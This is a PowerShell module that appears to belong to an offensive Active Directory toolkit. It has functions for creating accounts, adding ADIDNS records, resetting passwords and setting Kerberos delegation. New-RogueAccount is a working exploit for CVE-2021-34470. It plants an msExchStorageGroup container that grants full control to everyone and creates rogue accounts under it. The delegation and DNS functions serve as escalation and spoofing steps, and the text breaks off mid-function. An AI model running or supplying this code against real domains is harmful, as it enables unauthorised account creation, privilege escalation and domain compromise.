Function New-UserAccount {
<#
.SYNOPSIS
    Create a new user account in Active Directory.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    New-UserAccount creates a user object under the default container of a given Active Directory domain.

.PARAMETER Server
    Specifies the domain controller to query.

.PARAMETER SSL
    Use SSL connection to LDAP server.

.PARAMETER Credential
    Specifies the privileged account to use.

.PARAMETER SamAccountName
    Specifies the Security Account Manager (SAM) account name of the account to create.

.PARAMETER Password
    Specifies the password of the account to create.

.EXAMPLE
    PS C:\> New-UserAccount -Server DC.ADATUM.CORP -Credential 'ADATUM\testadmin' -SamAccountName testuser -Password P@ssw0rd
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Password
    )

    Begin {
        try {
            $rootDSE = Get-LdapRootDSE -Server $Server
        }
        catch {
            Write-Error "Domain controller unreachable"
            continue
        }

        if (-not $PSBoundParameters.ContainsKey('Password')) {
            $passwordSecure = Read-Host "Password" -AsSecureString
            $BSTR = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($passwordSecure)
            $Password = [Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
        }
    }

    Process {
        $defaultNC = $rootDSE.defaultNamingContext[0]
        $containerDN = "CN=Users,$defaultNC"
        $distinguishedName = "CN=$SamAccountName,$containerDN"
        if ($SSL) {
            $uac = '512' # NORMAL_ACCOUNT
        }
        else {
            $uac = '544' # NORMAL_ACCOUNT + PASSWD_NOTREQD
        }
        $passwordBytes = [Text.Encoding]::Unicode.GetBytes('"' + $Password + '"')
        $properties = @{sAMAccountName=$SamAccountName; userAccountControl=$uac; unicodePwd=$passwordBytes}
        $newObject = New-LdapObject -Server $Server -SSL:$SSL -DistinguishedName $distinguishedName -Class 'User' -Properties $properties -Credential $Credential -ErrorAction Stop
        Write-Host "[+] User object created: $newObject"
    }
}

Function New-ComputerAccount {
<#
.SYNOPSIS
    Create a new computer account in Active Directory.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    New-ComputerAccount creates a computer object under the default container of a given Active Directory domain.

.PARAMETER Server
    Specifies the domain controller to query.

.PARAMETER SSL
    Use SSL connection to LDAP server.

.PARAMETER Credential
    Specifies the privileged account to use.

.PARAMETER SamAccountName
    Specifies the Security Account Manager (SAM) account name of the account to create.

.PARAMETER Password
    Specifies the password of the account to create.

.EXAMPLE
    PS C:\> New-ComputerAccount -Server DC.ADATUM.CORP -Credential 'ADATUM\testadmin' -SamAccountName 'testcomputer$' -Password P@ssw0rd
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Password
    )

    Begin {
        try {
            $rootDSE = Get-LdapRootDSE -Server $Server
        }
        catch {
            Write-Error "Domain controller unreachable"
            continue
        }

        if (-not $PSBoundParameters.ContainsKey('Password')) {
            $passwordSecure = Read-Host "Password" -AsSecureString
            $BSTR = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($passwordSecure)
            $Password = [Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
        }
    }

    Process {
        $defaultNC = $rootDSE.defaultNamingContext[0]
        $containerDN = "CN=Computers,$defaultNC"
        $objectRDN = "CN=$SamAccountName".TrimEnd('$')
        $distinguishedName = "$objectRDN,$containerDN"
        $domain = $defaultNC -replace 'DC=' -replace ',','.'
        $dnsHostName = "$SamAccountName.$domain"
        $spn = @("HOST/$dnsHostName","RestrictedKrbHost/$dnsHostName","HOST/$SamAccountName","RestrictedKrbHost/$SamAccountName")
        if ($SSL) {
            $uac = '4096' # WORKSTATION_TRUST_ACCOUNT
        }
        else {
            $uac = '4128' # WORKSTATION_TRUST_ACCOUNT + PASSWD_NOTREQD
        }
        $passwordBytes = [Text.Encoding]::Unicode.GetBytes('"' + $Password + '"')
        $properties = @{sAMAccountName=$SamAccountName; userAccountControl=$uac; unicodePwd=$passwordBytes; dnsHostName=$dnsHostName; ServicePrincipalName=$spn}
        $newObject = New-LdapObject -Server $Server -SSL:$SSL -DistinguishedName $distinguishedName -Class 'Computer' -Properties $properties -Credential $Credential -ErrorAction Stop
        Write-Host "[+] Computer object created: $newObject"
    }
}

Function New-RogueAccount {
<#
.SYNOPSIS
    Create a new account (user or computer) in Active Directory by exploiting CVE-2021-34470.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    New-RogueAccount creates a msExchStorageGroup object under the current computer account, and creates a further user or computer object under it.

.PARAMETER Server
    Specifies the domain controller to query.

.PARAMETER SSL
    Use SSL connection to LDAP server.

.PARAMETER Credential
    Specifies the computer account to use.

.PARAMETER Class
    Specifies the account class to create, defaults to 'user'.

.PARAMETER SamAccountName
    Specifies the Security Account Manager (SAM) account name of the account to create.

.PARAMETER Password
    Specifies the password of the account to create.

.EXAMPLE
    PS C:\> PsExec.exe -i -s powershell.exe
    PS C:\> New-RogueAccount -Class computer -SamAccountName 'testmachine$' -Password P@ssw0rd

.EXAMPLE
    PS C:\> New-RogueAccount -Server DC.ADATUM.CORP -Credential 'ADATUM\testmachine$' -SamAccountName testuser -Password P@ssw0rd
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [string]
        $Server = (Get-WMIObject Win32_ComputerSystem | Select -ExpandProperty Domain),

        [Switch]
        $SSL,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('user', 'computer')]
        [String]
        $Class = 'user',

        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Password
    )

    Begin {
        $currentId = (Get-LdapCurrentUser -Server $Server -SSL:$SSL -Credential $Credential).UserName
        $computer = Get-LdapObject -Server $Server -SSL:$SSL -Credential $Credential -Filter "(sAMAccountName=$currentId)" -Properties 'DistinguishedName'

        if (-not $PSBoundParameters.ContainsKey('Password')) {
            $passwordSecure = Read-Host "Password" -AsSecureString
            $BSTR = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($passwordSecure)
            $Password = [Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
        }
    }

    Process {
        $sd = [DirectoryServices.ActiveDirectorySecurity]::new()
        $sd.SetSecurityDescriptorSddlForm("D:P(A;CI;GA;;;WD)", "Access")
        $ba = $sd.GetSecurityDescriptorBinaryForm()
        $containerClass = 'msExchStorageGroup'
        $containerRDN = "CN=$(-join ((0x41..0x5A) + (0x61..0x7A) | Get-Random -Count 11 | %{[char] $_}))"
        $distinguishedName = "$containerRDN,$($computer.DistinguishedName)"
        $properties = @{nTSecurityDescriptor=$ba}
        $newContainer = New-LdapObject -Server $Server -SSL:$SSL -DistinguishedName $distinguishedName -Class $containerClass -Properties $properties -Credential $Credential
        Write-Host "[+] Container object created: $newContainer"

        $objectRDN = "CN=$SamAccountName".TrimEnd('$')
        $distinguishedName = "$objectRDN,$newContainer"
        switch ($Class) {
            user {
                if ($SSL) {
                    $uac = '512' # NORMAL_ACCOUNT
                }
                else {
                    $uac = '544' # NORMAL_ACCOUNT + PASSWD_NOTREQD
                }
            }
            computer {
                if ($SSL) {
                    $uac = '4096' # WORKSTATION_TRUST_ACCOUNT
                }
                else {
                    $uac = '4128' # WORKSTATION_TRUST_ACCOUNT + PASSWD_NOTREQD
                }
            }
        }
        $passwordBytes = [Text.Encoding]::Unicode.GetBytes('"' + $Password + '"')
        $properties = @{sAMAccountName=$SamAccountName; userAccountControl=$uac; unicodePwd=$passwordBytes}
        $newObject = New-LdapObject -Server $Server -SSL:$SSL -DistinguishedName $distinguishedName -Class $Class -Properties $properties -Credential $Credential -ErrorAction Stop
        Write-Host "[+] $Class object created: $newObject"
    }
}

Function New-DomainDnsRecord {
<#
.SYNOPSIS
    Create a new DNS record in a given Active Directory domain.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    New-DomainDnsRecord adds a DNS node object to an Active Directory-Integrated DNS (ADIDNS) zone.

.PARAMETER Server
    Specifies the domain controller to query.

.PARAMETER SSL
    Use SSL connection to LDAP server.

.PARAMETER Credential
    Specifies the privileged account to use.

.PARAMETER RecordType
    Specifies the DNS record type, defaults to A.

.PARAMETER Name
    Specifies the DNS record name.

.PARAMETER Data
    Specifies the DNS record data, typically the destination IP address.

.PARAMETER ZoneName
    Specifies the DNS zone, defaults to Active Directory domain name.

.PARAMETER Static
    Creates a static record instead of a dynamic one.

.EXAMPLE
    PS C:\> New-DomainDnsRecord -Server DC.ADATUM.CORP -Credential 'ADATUM\testadmin' -DnsName test -DnsData "192.168.1.200"
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $True)]
        [ValidateSet("A","AAAA","CNAME","DNAME","MX","NS","PTR","SRV","TXT")]
        [String]
        $RecordType = "A",

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [Parameter(Mandatory = $True)]
        [ValidateScript({$_.Length -le 255})]
        [String]
        $Data,

        [ValidateNotNullOrEmpty()]
        [String]
        $ZoneName,

        [Switch]
        $Static
    )

    Begin {
        Function Local:New-DNSNameArray {
            Param ([String] $Name)
            $character_array = $Name.ToCharArray()
            [Array] $index_array = 0..($character_array.Count - 1) | Where-Object {$character_array[$_] -eq '.'}
            if($index_array.Count -gt 0) {
                $name_start = 0
                ForEach ($index in $index_array) {
                    $name_end = $index - $name_start
                    [Byte[]] $name_array += $name_end
                    [Byte[]] $name_array += [Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start,$name_end))
                    $name_start = $index + 1
                }
                [Byte[]] $name_array += ($Name.Length - $name_start)
                [Byte[]] $name_array += [Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start))
            }
            else {
                [Byte[]] $name_array = $Name.Length
                [Byte[]] $name_array += [Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start))
            }
            return $name_array
        }

        Function Local:New-PacketDNSSOAQuery {
            Param ([String] $Name)
            [Byte[]] $type = 0x00,0x06
            [Byte[]] $name = (New-DNSNameArray $Name) + 0x00
            [Byte[]] $length = [BitConverter]::GetBytes($Name.Count + 16)[1,0]
            [String] $random = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            [Byte[]] $random = $random.Split(" ") | ForEach-Object{[Char][Convert]::ToInt16($_,16)}
            [Byte[]] $transaction_ID = $random
            $DNSQuery = New-Object System.Collections.Specialized.OrderedDictionary
            $DNSQuery.Add("Length",$length)
            $DNSQuery.Add("TransactionID",$transaction_ID)
            $DNSQuery.Add("Flags",[Byte[]](0x01,0x00))
            $DNSQuery.Add("Questions",[Byte[]](0x00,0x01))
            $DNSQuery.Add("AnswerRRs",[Byte[]](0x00,0x00))
            $DNSQuery.Add("AuthorityRRs",[Byte[]](0x00,0x00))
            $DNSQuery.Add("AdditionalRRs",[Byte[]](0x00,0x00))
            $DNSQuery.Add("Queries_Name",$name)
            $DNSQuery.Add("Queries_Type",$type)
            $DNSQuery.Add("Queries_Class",[Byte[]](0x00,0x01))
            return $DNSQuery
        }

        Function Local:New-SOASerialNumberArray {
            Param ([String] $Server, [String] $Zone)
            $Zone = $Zone.ToLower()
            $DNS_client = New-Object Net.Sockets.TCPClient
            $DNS_client.Client.ReceiveTimeout = 3000
            try {
                $DNS_client.Connect($Server,"53")
                $DNS_client_stream = $DNS_client.GetStream()
                $DNS_client_receive = New-Object Byte[] 2048
                $packet_DNSQuery = New-PacketDNSSOAQuery $Zone
                [Byte[]] $DNS_client_send = @()
                foreach($field in $packet_DNSQuery.Values) {
                    $DNS_client_send += $field
                }
                $DNS_client_stream.Write($DNS_client_send,0,$DNS_client_send.Length) | Out-Null
                $DNS_client_stream.Flush()
                $DNS_client_stream.Read($DNS_client_receive,0,$DNS_client_receive.Length) | Out-Null
                $DNS_client.Close()
                $DNS_client_stream.Close()
                if($DNS_client_receive[9] -eq 0) {
                    Write-Error "[-] $Zone SOA record not found"
                }
                else {
                    $DNS_reply_converted = [BitConverter]::ToString($DNS_client_receive)
                    $DNS_reply_converted = $DNS_reply_converted -replace "-",""
                    $SOA_answer_index = $DNS_reply_converted.IndexOf("C00C00060001")
                    $SOA_answer_index = $SOA_answer_index / 2
                    $SOA_length = $DNS_client_receive[($SOA_answer_index + 10)..($SOA_answer_index + 11)]
                    [Array]::Reverse($SOA_length)
                    $SOA_length = [BitConverter]::ToUInt16($SOA_length,0)
                    [Byte[]] $SOA_serial_current_array = $DNS_client_receive[($SOA_answer_index + $SOA_length - 8)..($SOA_answer_index + $SOA_length - 5)]
                    $SOA_serial_current = [BitConverter]::ToUInt32($SOA_serial_current_array[3..0],0) + $Increment
                    [Byte[]] $SOA_serial_number_array = [BitConverter]::GetBytes($SOA_serial_current)[0..3]
                }

            }
            catch {
                Write-Error "[-] $Server did not respond on TCP port 53"
            }
            return ,$SOA_serial_number_array
        }

        Function Local:ConvertTo-DNSRecord {
            Param (
                [String] $Data,
                [String] $Server,
                [ValidateSet("A","AAAA","CNAME","DNAME","MX","NS","PTR","SRV","TXT")][String] $Type = "A",
                [String] $Zone,
                [Int] $TTL = 600,
                [Switch] $Static
            )
            $SOASerialNumberArray = New-SOASerialNumberArray -Server $Server -Zone $Zone
            switch ($Type) {
                'A' {
                    [Byte[]] $DNS_type = 0x01,0x00
                    [Byte[]] $DNS_length = ([BitConverter]::GetBytes(($Data.Split(".")).Count))[0..1]
                    [Byte[]] $DNS_data += ([Net.IPAddress][String]([Net.IPAddress] $Data)).GetAddressBytes()
                }
                'AAAA' {
                    [Byte[]] $DNS_type = 0x1c,0x00
                    [Byte[]] $DNS_length = ([BitConverter]::GetBytes(($Data -replace ":","").Length / 2))[0..1]
                    [Byte[]] $DNS_data += ([Net.IPAddress][String]([Net.IPAddress] $Data)).GetAddressBytes()
                }
                'CNAME' {
                    [Byte[]] $DNS_type = 0x05,0x00
                    [Byte[]] $DNS_length = ([BitConverter]::GetBytes($Data.Length + 4))[0..1]
                    [Byte[]] $DNS_data = $Data.Length + 2
                    $DNS_data += ($Data.Split(".")).Count
                    $DNS_data += New-DNSNameArray $Data
                    $DNS_data += 0x00
                }
                'DNAME' {
                    [Byte[]] $DNS_type = 0x27,0x00
                    [Byte[]] $DNS_length = ([BitConverter]::GetBytes($Data.Length + 4))[0..1]
                    [Byte[]] $DNS_data = $Data.Length + 2
                    $DNS_data += ($Data.Split(".")).Count
                    $DNS_data += New-DNSNameArray $Data
                    $DNS_data += 0x00
                }
                'MX' {
                    [Byte[]] $DNS_type = 0x0f,0x00
                    [Byte[]] $DNS_length = ([BitConverter]::GetBytes($Data.Length + 6))[0..1]
                    [Byte[]] $DNS_data = [Bitconverter]::GetBytes($Preference)[1,0]
                    $DNS_data += $Data.Length + 2
                    $DNS_data += ($Data.Split(".")).Count
                    $DNS_data += New-DNSNameArray $Data
                    $DNS_data += 0x00
                }
                'NS' {
                    [Byte[]] $DNS_type = 0x02,0x00
                    [Byte[]] $DNS_length = ([BitConverter]::GetBytes($Data.Length + 4))[0..1]
                    [Byte[]] $DNS_data = $Data.Length + 2
                    $DNS_data += ($Data.Split(".")).Count
                    $DNS_data += New-DNSNameArray $Data
                    $DNS_data += 0x00
                }
                'PTR' {
                    [Byte[]] $DNS_type = 0x0c,0x00
                    [Byte[]] $DNS_length = ([BitConverter]::GetBytes($Data.Length + 4))[0..1]
                    [Byte[]] $DNS_data = $Data.Length + 2
                    $DNS_data += ($Data.Split(".")).Count
                    $DNS_data += New-DNSNameArray $Data
                    $DNS_data += 0x00
                }
                'SRV' {
                    [Byte[]] $DNS_type = 0x21,0x00
                    [Byte[]] $DNS_length = ([BitConverter]::GetBytes($Data.Length + 10))[0..1]
                    [Byte[]] $DNS_data = [Bitconverter]::GetBytes($Priority)[1,0]
                    $DNS_data += [Bitconverter]::GetBytes($Weight)[1,0]
                    $DNS_data += [Bitconverter]::GetBytes($Port)[1,0]
                    $DNS_data += $Data.Length + 2
                    $DNS_data += ($Data.Split(".")).Count
                    $DNS_data += New-DNSNameArray $Data
                    $DNS_data += 0x00
                }
                'TXT' {
                    [Byte[]] $DNS_type = 0x10,0x00
                    [Byte[]] $DNS_length = ([BitConverter]::GetBytes($Data.Length + 1))[0..1]
                    [Byte[]] $DNS_data = $Data.Length
                    $DNS_data += [Text.Encoding]::UTF8.GetBytes($Data)
                }
            }
            [Byte[]] $DNS_TTL = [BitConverter]::GetBytes($TTL)
            [Byte[]] $DNS_record = $DNS_length + $DNS_type + 0x05,0xF0,0x00,0x00 + $SOASerialNumberArray[0..3] + $DNS_TTL[3..0] + 0x00,0x00,0x00,0x00
            if ($Static) {
                $DNS_record += 0x00,0x00,0x00,0x00
            }
            else {
                $timestamp = [Int64](([Datetime]::UtcNow)-(Get-Date "1/1/1601")).TotalHours
                $timestamp = [BitConverter]::ToString([BitConverter]::GetBytes($timestamp))
                $timestamp = $timestamp.Split("-") | ForEach-Object{[Convert]::ToInt16($_,16)}
                $timestamp = $timestamp[0..3]
                $DNS_record += $timestamp
            }
            $DNS_record += $DNS_data
            return ,$DNS_record
        }
    }

    Process {
        try {
            $rootDSE = Get-LdapRootDSE -Server $Server
            $defaultNC = $rootDSE.defaultNamingContext[0]
            $domain = $defaultNC -replace 'DC=' -replace ',','.'
        }
        catch {
            Write-Error "Domain controller unreachable" -ErrorAction Stop
        }
        if (-not $ZoneName) {
            $ZoneName = $domain
        }
        $distinguishedName = "DC=$Name,DC=$ZoneName,CN=MicrosoftDNS,DC=DomainDNSZones,$defaultNC"
        $dnsRecord = ConvertTo-DNSRecord -Server $Server -Type $RecordType -Data $Data -Zone $ZoneName -Static:$Static
        $properties = @{dnsRecord=$dnsRecord}
        $newObject = New-LdapObject -Server $Server -SSL:$SSL -DistinguishedName $distinguishedName -Class 'dnsNode' -Properties $properties -Credential $Credential -ErrorAction Stop
        Write-Host "[+] DNS record object created: $newObject"
    }
}

Function Set-UserPassword {	
<#
.SYNOPSIS
    Change the password of a given Active Directory account.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Set-UserPassword renews the password of an Active Directory account, using its current password (expired or not).

.PARAMETER Server
    Specifies the domain controller to query.

.PARAMETER SamAccountName
    Specifies the Security Account Manager (SAM) account name of the account to change password.

.PARAMETER CurrentPassword
    Specifies the current password of the account.

.PARAMETER NewPassword
    Specifies the new password to set.

.PARAMETER Reset
    Enables password reset.

.PARAMETER Credential
    Specifies the privileged account to use for password reset.

.PARAMETER SSL
    Use SSL connection to LDAP server for password reset.

.EXAMPLE
    PS C:\> Set-UserPassword -Server DC.ADATUM.CORP -SamAccountName testuser -CurrentPassword P@ssw0rd -NewPassword Str0ngP@ssw0rd

.EXAMPLE
    PS C:\> Set-UserPassword -Server DC.ADATUM.CORP -SamAccountName testuser -NewPassword Str0ngP@ssw0rd -Reset -Credential ADATUM\testadmin
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [ValidateNotNullOrEmpty()]
        [String]
        $SamAccountName,

        [String]
        $CurrentPassword,

        [String]
        $NewPassword,

        [Switch]
        $Reset,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $SSL
    )

    $DllImport = @'
[DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
public static extern bool NetUserChangePassword(string domain, string username, string currentPassword, string newpassword);
'@
    $NetApi32 = Add-Type -MemberDefinition $DllImport -Name NetApi32 -Namespace Win32 -PassThru

    if ((-not $Reset) -and (-not $PSBoundParameters.ContainsKey('CurrentPassword'))) {
        $currentPasswordSecure = Read-Host "Current password" -AsSecureString
        $BSTR = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($currentPasswordSecure)
        $CurrentPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
    }
    if (-not $PSBoundParameters.ContainsKey('NewPassword')) {
        $newPasswordSecure = Read-Host "New password" -AsSecureString
        $BSTR = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($newPasswordSecure)
        $NewPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
    }

    if (-not $Reset) {
        if ($NetApi32::NetUserChangePassword($Server, $SamAccountName, $CurrentPassword, $NewPassword)) {
            Write-Error "Password change failed for $SamAccountName." -ErrorAction Stop
        }
    }
    else {
        $object = Get-LdapObject -Server $Server -SSL:$SSL -Filter "(sAMAccountName=$SamAccountName)" -Properties 'distinguishedName' -Credential $Credential
        $passwordBytes = [Text.Encoding]::Unicode.GetBytes('"' + $NewPassword + '"')
        $properties = @{unicodePwd=$passwordBytes}
        Set-LdapObject -Server $Server -SSL:$SSL -DistinguishedName $object.distinguishedName -Properties $properties -Operation Replace -Credential $Credential -ErrorAction Stop
    }
    Write-Host "[*] Password change succeeded for $SamAccountName"
}

Function Set-KerberosDelegation {
<#
.SYNOPSIS
    Configure Kerberos delegations.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Set-KerberosDelegation adds or removes a Kerberos delegation for a given Active Directory  account.
    The specified Kerberos delegation can be unconstrained, constrained (with or without protocol transition) or resource-based constrained (RBCD).

.PARAMETER Server
    Specifies the domain controller to query.

.PARAMETER Credential
    Specifies the privileged account to use for password reset.

.PARAMETER SSL
    Use SSL connection to LDAP server for password reset.

.PARAMETER SamAccountName
    Specifies the Security Account Manager (SAM) account name of the account that are going to be allowed to delegate.

.PARAMETER Unconstrained
    Configures Unconstrained delegation for the specified account.

.PARAMETER Constrained
    Configures Constrained delegation for the specified account.

.PARAMETER ProtocolTransition
    Enables Protocol Transition for the Constrained delegation.

.PARAMETER TargetSPN
    Specifies the Service Principal Name (SPN) of the service targeted by the constrained delegation.

.PARAMETER RBCD
    Configures Resource-Based Constrained delegation for the specified account.

.PARAMETER TargetDN
    Specifies the DistinguishedName (DN) of the service targeted by the RBCD delegation.

.PARAMETER Operation
    Specifies whether the specified delegation will be added or removed, defaults to 'Add'.

.EXAMPLE
    PS C:\> Set-KerberosDelegation -Server DC.ADATUM.CORP -SamAccountName 'testcomputer$' -Unconstrained

.EXAMPLE
    PS C:\> Set-KerberosDelegation -Server DC.ADATUM.CORP -SamAccountName 'testcomputer$' -Constrained -TargetSPN 'CIFS/WS10.ADATUM.CORP' -ProtocolTransition

.EXAMPLE
    PS C:\> Set-KerberosDelegation -Server DC.ADATUM.CORP -SamAccountName 'testcomputer$' -RBCD -TargetDN 'CN=WS10,CN=Computers,DC=ADATUM,DC=CORP'
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $True)]
        [String]
        $SamAccountName,

        [Switch]
        $Unconstrained,

        [Parameter(ParameterSetName = 'ConstrainedDelegation')]
        [Switch]
        $Constrained,

        [Switch]
        $ProtocolTransition,

        [Parameter(Mandatory = $True, ParameterSetName = 'ConstrainedDelegation')]
        [String]
        $TargetSPN,

        [Parameter(ParameterSetName = 'RBCDDelegation')]
        [Switch]
        $RBCD,

        [Parameter(Mandatory = $True, ParameterSetName = 'RBCDDelegation')]
        [String]
        $TargetDN,

        [ValidateSet('Add', 'Remove')]
        [String]
        $Operation = 'Add'
    )

    Begin {
        # Get specified pincipal identity and target service objects
        $filter = "(sAMAccountName=$SamAccountName)"
        $properties = 'objectSid','distinguishedName','servicePrincipalName','userAccountControl','msDS-AllowedToDelegateTo'
        $principal = Get-LdapObject -Server $Server -SSL:$SSL -Filter $filter -Properties $properties -Credential $Credential
        if (-not $principal) {
            Write-Error "The account $SamAccountName does not exist."
            continue
        }
        if ($RBCD) {
            $filter = "(DistinguishedName=$TargetDN)"
            $properties = 'distinguishedName','msDS-AllowedToActOnBehalfOfOtherIdentity'
            $targetService = Get-LdapObject -Server $Server -SSL:$SSL -Filter $filter -Properties $properties -Credential $Credential
            if (-not $targetService) {
                Write-Error "The account $TargetDN does not exist."
                continue
            }
        }

        # Check UserAccountControl
        if ($Unconstrained) {
            # TRUSTED_FOR_DELEGATION flag
            if (($Operation -eq 'Add') -and ($principal.userAccountControl -band 524288) ) {
                Write-Error "Unconstrained delegation is already configured for the account $SamAccountName."
                continue
            }
            elseif (($Operation -eq 'Remove') -and -not ($principal.userAccountControl -band 524288)) {
                Write-Error "Unconstrained delegation is not configured for the account $SamAccountName."
                continue
            }
        }
        if ($ProtocolTransition) {
            # TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION flag
            if (($Operation -eq 'Add') -and ($principal.userAccountControl -band 16777216) ) {
                Write-Error "Protocol Transition is already configured for the account $SamAccountName."
                continue
            }
            elseif (($Operation -eq 'Remove') -and -not ($principal.userAccountControl -band 16777216)) {
                Write-Error "Protocol Transition is not configured for the account $SamAccountName."
                continue
            }
        }

        # Check servicePrincipalName
        if ($Constrained -or $ProtocolTransition) {
            if (-not $principal.servicePrincipalName) {
                Write-Warning "The account $SamAccountName does not have ServicePrincipalName attribute set. Therefore, the delegation will not take effect."
            }
        }

        # Check msDS-AllowedToDelegateTo
        if ($Constrained -and $principal.'msDS-AllowedToDelegateTo') {
            if (($Operation -eq 'Add') -and ($principal.'msDS-AllowedToDelegateTo'.Contains($TargetSPN))) {
                Write-Error "Constrained delegation targetting $TargetSPN is already configured for the account $SamAccountName."
                continue
            }
            if (($Operation -eq 'Remove') -and -not ($principal.'msDS-AllowedToDelegateTo'.Contains($TargetSPN))) {
                Write-Error "Constrained delegation targetting $TargetSPN is not configured for the account $SamAccountName."
                continue
            }
        }

        # Check msDS-AllowedToActOnBehalfOfOtherIdentity
        if ($RBCD) {
            $principalSid = (New-Object Security.Principal.SecurityIdentifier $principal.objectSid,0).Value
            $principalSids = @()
            $currentSddlString = ""
            if ($ataobooi = $targetService.'msDS-AllowedToActOnBehalfOfOtherIdentity') {
                $sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $ataobooi, 0
                $sd.DiscretionaryAcl | ForEach-Object {
                    $principalSids += $_.SecurityIdentifier.ToString()
                }
                if (($Operation -eq 'Add') -and $principalSids.Contains($principalSid)) {
                    Write-Error "Resource-Based Constrained delegation allowing $SamAccountName is already configured for $TargetDN."
                    continue
                }
                if (($Operation -eq 'Remove') -and -not $principalSids.Contains($principalSid)) {
                    Write-Error "Resource-Based Constrained delegation allowing $SamAccountName is not configured for $TargetDN."
                    continue
                }
                $currentSddlString = (New-Object Management.ManagementClass Win32_SecurityDescriptorHelper).BinarySDToSDDL($ataobooi).SDDL
            }
        }
    }

    Process {
        if ($Unconstrained) {
            $userAccountControl = $($principal.userAccountControl) -bxor 524288
            Write-Verbose "Current UserAccountControl: $($principal.userAccountControl)"
            Write-Verbose "New UserAccountControl: $userAccountControl"
            $properties = @{"userAccountControl"=$userAccountControl}
            Set-LdapObject -Server $Server -SSL:$SSL -DistinguishedName $principal.distinguishedName -Properties $properties -Operation Replace -Credential $Credential
        }
        if ($ProtocolTransition) {
            $userAccountControl = $($principal.userAccountControl) -bxor 16777216
            Write-Verbose "Current UserAccountControl: $($principal.userAccountControl)"
            Write-Verbose "New UserAccountControl: $userAccountControl"
            $properties = @{"userAccountControl"=$userAccountControl}
            Set-LdapObject -Server $Server -SSL:$SSL -DistinguishedName $principal.distinguishedName -Properties $properties -Operation Replace -Credential $Credential
        }
        if ($Constrained) {
            $properties = @{"msDS-AllowedToDelegateTo"=$TargetSPN}
            Set-LdapObject -Server $Server -SSL:$SSL -DistinguishedName $principal.distinguishedName -Properties $properties -Operation $Operation -Credential $Credential
        }
        if ($RBCD) {
            $sddlString = "(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$principalSid)"
            switch ($Operation) {
                "Add" {
                    if ($currentSddlString) {
                        $sddlString = $currentSddlString + $sddlString
                    }
                    else {
                        $sddlString = 'O:BAD:' + $sddlString
                    }
                }
                "Remove" {
                    if ($currentSddlString -eq $sddlString) {
                        $sddlString = ""
                    }
                    else {
                        $sddlString = $currentSddlString.Replace($sddlString, "")
                    }
                }
            }
            Write-Verbose "Current SDDL: $currentSddlString"
            Write-Verbose "New SDDL: $sddlString"
            if ($sddlString) {
                # Restore msDS-AllowedToActOnBehalfOfOtherIdentity
                $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $sddlString
                $sdBytes = New-Object byte[] ($SD.BinaryLength)
                $SD.GetBinaryForm($sdBytes, 0)
                $properties = @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$sdBytes}
